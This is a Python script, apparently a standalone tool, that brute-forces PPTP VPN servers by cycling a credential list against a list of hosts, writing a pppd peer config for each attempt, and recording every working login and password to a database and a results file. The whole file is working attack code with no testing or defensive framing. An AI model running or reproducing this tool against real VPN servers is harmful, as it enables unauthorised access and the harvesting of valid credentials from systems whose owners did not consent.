import subprocess
import time
import requests
from pathlib import Path
import logging
from database import base_session, HostsDataTable
import psutil
import ppp

logging.basicConfig(level=logging.INFO)


class PPTPBrute:
    file_sample = open('config_example').read()
    config_path = Path('/etc/ppp/peers/vpn_brute')
    pptp_logger = logging.getLogger('PPTP')

    @classmethod
    def poff(cls):
        subprocess.run(['poff', 'vpn_brute'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # works only with this
        time.sleep(1)

    @classmethod
    def connect_attempt(cls, host: str, login: str, password: str):
        content = cls.file_sample.format(host=host, login=login, password=password)
        with open(cls.config_path, 'w') as file:
            file.write(content + '\n')
        process = subprocess.run(['pon', 'vpn_brute'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if process.returncode != 0:
            raise process.returncode
        cls.pptp_logger.info(
            f'PPTP configuration for {host} has created. Running pon command and waiting for connection 10 seconds.'
        )
        for i in range(20):
            if psutil.net_if_addrs().get('ppp0'):
                cls.poff()
                cls.pptp_logger.info(f'Success! Host: {host} username: {login} password: {password}')
                host_orm = HostsDataTable(host=host, username=login, password=password, port=1723)
                host_orm.add_or_edit_data_to_base()
                base_session.commit()
                with open('result.txt', 'a') as result:
                    result.write(f'{host}:{login}:{password}\n')
                return host_orm
            time.sleep(1)
        cls.pptp_logger.info('Connection failed!')
        # need to shut down worker
        cls.poff()


def cli():
    hosts = open('vpn_txt').read().split('\n')
    credentials = open('credentials.txt').read().split('\n')
    for num, host in enumerate(hosts, start=1):
        print(num, "/", len(hosts))
        for line in credentials:
            login, password = line.split(':')
            try:
                PPTPBrute.connect_attempt(host=host, login=login, password=password)
            except KeyboardInterrupt:
                PPTPBrute.poff()


if __name__ == '__main__':
    cli()
    